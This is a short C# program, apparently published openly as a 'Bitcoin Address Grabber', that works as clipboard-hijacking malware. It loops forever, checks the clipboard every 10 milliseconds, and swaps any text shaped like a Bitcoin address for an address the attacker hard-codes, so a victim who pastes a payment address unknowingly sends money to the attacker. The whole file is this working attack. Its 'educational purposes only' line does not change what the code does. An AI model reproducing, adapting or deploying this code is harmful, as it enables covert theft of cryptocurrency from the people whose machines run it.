using System;
using System.Windows.Forms;
using System.Threading;

//       │ Author     : NYAN CAT
//       │ Name       : Bitcoin Address Grabber
//       │ Contact    : https://github.com/NYAN-x-CAT

//       This program is distributed for educational purposes only.

namespace Bitcoin_Grabber
{
    class Program
    {
        [Obsolete]
        [STAThread]
        static void Main()
        {
            // the address always start with 1 or 3 or bc1
            // the length is between 26-35 characters
            // more info https://en.bitcoin.it/wiki/Address
            string bitcoinAddress = "1This is your bitcoin address";
            string clipboard = string.Empty;

            for (; ; )
            {
                Thread.Sleep(10);
                if (Clipboard.ContainsText())
                {
                    clipboard = Clipboard.GetText();
                    if (clipboard != bitcoinAddress)
                        if (clipboard.Length >= 26 && clipboard.Length <= 35)
                            if (clipboard.StartsWith("1") ||
                                clipboard.StartsWith("3") ||
                                clipboard.StartsWith("bc1"))
                            {
                                new Thread(() =>
                                {
                                    Clipboard.SetText(bitcoinAddress);
                                })
                                { ApartmentState = ApartmentState.STA }.Start();
                            }
                }
            }


        }
    }
}